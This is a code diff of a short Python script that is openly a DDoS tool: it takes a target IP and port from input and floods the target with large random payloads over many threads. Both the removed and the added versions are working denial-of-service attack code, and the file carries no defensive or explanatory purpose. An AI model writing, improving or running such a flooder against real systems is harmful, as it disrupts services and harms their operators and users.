@@ -1,24 +1,25 @@
 import socket
 import random
 import threading
-import time
 
-target_ip = "0.0.0.0"
-target_ports = [i for i in range(1, 65536)]
+fake_ip = str(input("Fake IP = "))
+target_ip = str(input("Target IP = "))
+target_port = int(input("Target Port = "))
 
 def ddos():
-    while True:
-        try:
-            port = random.choice(target_ports)
-            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-            sock.connect((target_ip, port))
-            payload = random._urandom(random.randint(32768, 65536)) * random.randint(500, 1000)
-            sock.sendto(payload, (target_ip, port))
-            print("[*] DDoS ", target_ip, ":", port)
-            time.sleep(random.uniform(0.0001, 0.001))
-        except socket.error:
-            print("[!] Error")
+    try:
+        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        sock.connect((target_ip, target_port))
+        print("[?] DDoS Created for: ( IP:", target_ip, "|", "Port:", target_port, ")")
+        payload = random._urandom(random.randint(32768, 65536)) * random.randint(500, 1000)
+        while True:
+            sock.sendto(payload, (target_ip, target_port))
+            print("[*] DDoS Successful for: ( IP:", target_ip, "Port:", "|", target_port, ")")
+    except KeyboardInterrupt:
+        print("[!] DDoS Exit")
+    except Exception as e:
+        print("[!] DDoS an error occurred:", str(e))
 
-for i in range(1000):
-    t = threading.Thread(target=ddos)
-    t.start()
+for i in range(10):
+    thread = threading.Thread(target=ddos)
+    thread.start()
